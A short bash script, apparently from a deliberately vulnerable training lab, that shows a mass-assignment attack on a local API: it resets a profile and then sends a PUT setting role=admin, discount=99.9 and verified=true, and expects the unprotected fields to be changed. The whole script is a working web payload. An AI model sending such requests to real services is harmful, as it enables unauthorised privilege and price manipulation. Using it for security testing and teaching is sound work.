#!/bin/bash
echo "=== Mass Assignment Partial: role bloqueado, discount y verified NO ==="

# Resetear primero
curl -s -X POST http://localhost:8080/api/mass-assignment/partial/profile/2/reset > /dev/null

echo "Enviando role=admin (bloqueado) + discount=99.9 + verified=true (bypass):"
echo ""
curl -s -X PUT -H "Content-Type: application/json" \
  -d '{"name":"Roberto","role":"admin","discount":99.9,"verified":true}' \
  http://localhost:8080/api/mass-assignment/partial/profile/2 | python -m json.tool

echo ""
echo "Resultado esperado: ATTACK_SUCCESS — role rechazado, pero discount=99.9 y verified=true modificados"
